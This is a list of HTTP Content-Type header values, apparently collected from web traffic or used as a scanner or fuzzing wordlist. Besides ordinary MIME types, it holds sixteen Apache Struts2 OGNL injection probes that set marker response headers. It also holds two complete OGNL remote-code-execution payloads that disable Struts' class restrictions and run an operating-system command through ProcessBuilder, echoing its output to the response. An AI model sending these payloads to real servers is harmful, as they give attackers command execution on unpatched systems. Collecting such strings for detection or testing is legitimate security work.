%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('2bFnrc6U','1')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('2bgxvxmx','1')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('4zBbsjKH','1')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('6G6ntt2w','1')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('7N5bttjx','1')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('GNcWu85f','1')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('MK4eDagb','1')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('NawNJ8IP','1')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('W3uRRVrC','W3uRRVrC')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('ggymtl2p','1')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('nv8qg8ai','1')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('o0mwpxwp','1')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('uDLnte5a','1')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('y2BkNIlu','1')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('yXBk3y9n','1')}.multipart/form-data
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('zM4paiP2','1')}.multipart/form-data
%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo WiNdOwSsErVeR'}:{'/bin/bash','-c','echo LiNuXsErVeR'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
application/dns-message
application/ipp
application/json
application/json; charset=utf-8
application/json;charset=utf-8
application/soap+xml; charset=utf-8
application/soap+xml;charset=UTF-8
application/x-www-form-urlencoded
application/x-www-form-urlencoded; charset=UTF-8
application/x-www-form-urlencoded; charset=UTF-8 
application/x-www-form-urlencoded;charset=UTF-8
application/xml
multipart/form-data; boundary=1744fc5d26a2c8793df280174e37f73a
text/html
text/html; charset=UTF-8
text/html; charset=utf-8
text/plain
text/xml
text/xml; Charset=UTF-8
text/xml; charset="utf-8"
x-application/hessian